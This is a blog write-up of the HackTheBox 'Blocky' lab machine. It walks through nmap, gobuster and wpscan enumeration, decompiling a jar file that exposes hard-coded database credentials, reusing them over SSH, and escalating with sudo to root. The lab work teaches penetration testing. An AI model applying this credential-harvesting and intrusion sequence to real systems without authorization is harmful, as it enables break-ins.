---
layout: post
title: "HackTheBox - Blocky writeup"
subtitle: "~ Walkthrough of Blocky machine from HackTheBox ~"
date: 2017-12-09
author: V3ded
category: CTF
tags: blog ctf pentesting hackthebox
finished: true
excerpt_separator: <!--more-->
---

<img src="/img/blog/htb-blocky/htb-blocky-00.png" width="417" height="136">
# Introduction
Blocky is another machine in my continuation of `HackTheBox` series. Rated easy to intermediate difficulty, it's a good box for beginners or casual pentester enthusiasts. Let's get right into it! <!--more-->

***

# Recon

As always, start out with nmap (IP can be obtained from HTB's dashboard):

```console
root@EdgeOfNight:~# nmap -A -sS -T4 10.10.10.37

Starting Nmap 7.50 ( https://nmap.org ) at 2017-12-08 10:09 CST
Nmap scan report for 10.10.10.37
Host is up (0.076s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (EdDSA)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
Aggressive OS guesses: Linux 3.10 - 4.8 (94%), Linux 3.13 (94%), Linux 3.13 or 4.2 (94%), Linux 4.4 (94%), Linux 3.16 (93%), Linux 3.16 - 4.6 (92%), Linux 3.12 (91%), Linux 3.18 (91%), Linux 3.2 - 4.8 (91%), Asus RT-AC66U WAP (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8192/tcp)
HOP RTT      ADDRESS
1   80.34 ms [REDACTED]
2   79.21 ms 10.10.10.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.75 seconds
```

3 open services are running - *SSH* (22), *FTP* (21) and *HTTP* (80). To make this blog a bit shorter I will leave out enumeration of FTP and SSH as none of them lead to this machine's solution. If you're interested about learning enumeration of either of these I'd suggest **bitvijay's** blogposts - [here](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#ftp){:target="_blank"} and [here](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#ssh-port-22){:target="_blank"}.

### - Port 80

Upon visiting the webpage we are greeted with:

<a href="/img/blog/htb-blocky/htb-blocky-01.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-blocky/htb-blocky-01.png"></a>

Following the normal enumeration procedures - vulnerability scanning and directory bruteforcing we discover multiple points of interest. Running `gobuster` presents us with many directories which we can look into:
```console
root@EdgeOfNight:~# gobuster -e -u 10.10.10.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.37/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
[+] Expanded     : true
=====================================================
http://10.10.10.37/wiki (Status: 301)
http://10.10.10.37/wp-content (Status: 301)
http://10.10.10.37/plugins (Status: 301)
http://10.10.10.37/wp-includes (Status: 301)
http://10.10.10.37/javascript (Status: 301)
http://10.10.10.37/wp-admin (Status: 301)
http://10.10.10.37/phpmyadmin (Status: 301)
```
> **Note**: gobuster can be installed with apt-get install gobuster
  
and running `wpscan` allows us to enumerate the current wordpress installation (look at the nmap scan, mentions that the webpage is running WP):
```console
root@EdgeOfNight:~/Desktop# wpscan -u 10.10.10.37 --enumerate 
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://10.10.10.37/

[!] The WordPress 'http://10.10.10.37/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <http://10.10.10.37/index.php/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[+] XML-RPC Interface available under: http://10.10.10.37/xmlrpc.php
[!] Upload directory has directory listing enabled: http://10.10.10.37/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://10.10.10.37/wp-includes/

[+] WordPress version 4.8 (Released on 2017-06-08) identified from advanced fingerprinting, meta generator, links opml, stylesheets numbers
[!] 12 vulnerabilities identified from the version number

[!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8905
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
    Reference: https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
[i] Fixed in: 4.8.2

[!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/8910
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41398
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
[i] Fixed in: 4.8.2

[!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
    Reference: https://wpvulndb.com/vulnerabilities/8911
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41457
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
[i] Fixed in: 4.8.2

[!] Title: WordPress 4.4-4.8.1 - Path Traversal in Customizer 
    Reference: https://wpvulndb.com/vulnerabilities/8912
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41397
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722
[i] Fixed in: 4.8.2

[!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed
    Reference: https://wpvulndb.com/vulnerabilities/8913
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41448
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724
[i] Fixed in: 4.8.2

[!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor
    Reference: https://wpvulndb.com/vulnerabilities/8914
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41395
    Reference: https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726
[i] Fixed in: 4.8.2

[!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
    Reference: https://wpvulndb.com/vulnerabilities/8807
    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
    Reference: https://core.trac.wordpress.org/ticket/25239
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295

[!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
    Reference: https://wpvulndb.com/vulnerabilities/8941
    Reference: https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
    Reference: https://twitter.com/ircmaxell/status/923662170092638208
    Reference: https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510
[i] Fixed in: 4.8.3

[!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload
    Reference: https://wpvulndb.com/vulnerabilities/8966
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092
[i] Fixed in: 4.8.4

[!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping
    Reference: https://wpvulndb.com/vulnerabilities/8967
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094
[i] Fixed in: 4.8.4

[!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping
    Reference: https://wpvulndb.com/vulnerabilities/8968
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093
[i] Fixed in: 4.8.4

[!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing
    Reference: https://wpvulndb.com/vulnerabilities/8969
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d8/com/myfirstplugin/33326c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091
[i] Fixed in: 4.8.4

[+] WordPress theme in use: twentyseventeen - v1.3

[+] Name: twentyseventeen - v1.3
 |  Last updated: 2017-11-16T00:00:00.000Z
 |  Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
 |  Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
[!] The version is out of date, the latest version is 1.4
 |  Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css
 |  Theme Name: Twenty Seventeen
 |  Theme URI: https://wordpress.org/themes/twentyseventeen/
 |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating installed plugins (only ones with known vulnerabilities) ...

   Time: 00:00:19 <==========================================================================================================================================================> (1586 / 1586) 100.00% Time: 00:00:19

[+] No plugins found

[+] Enumerating installed themes (only ones with known vulnerabilities) ...

   Time: 00:00:03 <============================================================================================================================================================> (283 / 283) 100.00% Time: 00:00:03

[+] No themes found

[+] Enumerating timthumb files ...

                                                                                                                                                                                                                      Time: 00:01:01 <==========================================================================================================================================================> (2541 / 2541) 100.00% Time: 00:01:01

[+] No timthumb files found

[+] Enumerating usernames ...
[+] Identified the following 3 user/s:
    +----+-------+---------+
    | Id | Login | Name    |
    +----+-------+---------+
    | 1  | notch | Notch – |
    | 2  | feed  |         |
    | 3  | feed  |         |
    +----+-------+---------+

[+] Finished: Fri Dec  8 10:43:37 2017
[+] Requests Done: 4471
[+] Memory used: 117.645 MB
[+] Elapsed time: 00:01:32



```
> --enumerate = enumerates everything including plugins, users, etc.

That's a lot of vulnerabilities, isn't it? Unfortunately none of them can be exploited (we can at least note down the username `notch`). Proceeding to browse previously mentioned directories, I notice that `/plugins/` folder has *jar* files inside it which can be easily [reverse engineered or disassembled](https://tools.kali.org/reverse-engineering/jad){:target="_blank"}. Hopefully we can find some hard-coded credentials?

<a href="/img/blog/htb-blocky/htb-blocky-02.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-blocky/htb-blocky-02.png"></a>

Steps:
* Download the **BlockyCore** jar file
* Open it up and navigate to `/com/myfirstplugin/`
* Extract the BlockyCore.class
* Use jad to decompile it
* View the source via `cat` command 

```console
root@EdgeOfNight:~/Downloads# jad BlockyCore.class && cat BlockyCore.jad
Parsing BlockyCore.class...The class file version is 52.0 (only 45.3, 46.0 and 47.0 are supported)
 Generating BlockyCore.jad
// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   BlockyCore.java

package com.myfirstplugin;


public class BlockyCore
{

    public BlockyCore()
    {
        sqlHost = "localhost";
        sqlUser = "root";
        sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
    }

    public void onServerStart()
    {
    }

    public void onServerStop()
    {
    }

    public void onPlayerJoin()
    {
        sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
    }

    public void sendMessage(String s, String s1)
    {
    }

    public String sqlHost;
    public String sqlUser;
    public String sqlPass;
}
``` 
> *jad* produces a file called **BlockyCore.jad** which I just printed out using *cat*

My assumptions were correct and we successfully extracted some database credentials. 
```console
sqlHost = "localhost";
sqlUser = "root";
sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```
There are two main ways one can go from here on - change the wordpress password of **notch** via */phpmyadmin/* and upload a php webshell OR simply use the gained credentials to SSH into the box. To my knowledge only the second options works because php web shell won't allow you to escalate privileges (correct me if I'm wrong though)! 

```console
root@EdgeOfNight:~# ssh notch@10.10.10.37

notch@10.10.10.37's password: 8YsqfCTnvxAUeduzjNSXe22
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Fri Dec  8 10:39:57 2017 from 10.10.14.217
notch@Blocky:~$
```

Now go and get that user flag!

***

# Privilege escalation
Simply do `sudo -l` which reveals that our user can run any command with sudo privileges:
```console
notch@Blocky:~$ sudo -l
[sudo] password for notch: 8YsqfCTnvxAUeduzjNSXe22
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

`sudo su` can be therefore easily used to gain root access!

<a href="/img/blog/htb-blocky/htb-blocky-03.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-blocky/htb-blocky-03.png"></a>

### Blocky rooted!

***

# Conclusion 

While this might not have been the hardest machine I ever did, I enjoyed it nonetheless. Quick straight-forward problems and their solutions make Blocky a very appealing machine to the beginners. In the end my writeup turned up to be pretty short, so sorry about that. If you have any questions feel free to contact me on the [about](/about/){:target="_blank"} page or use the comment down below!

~V3  

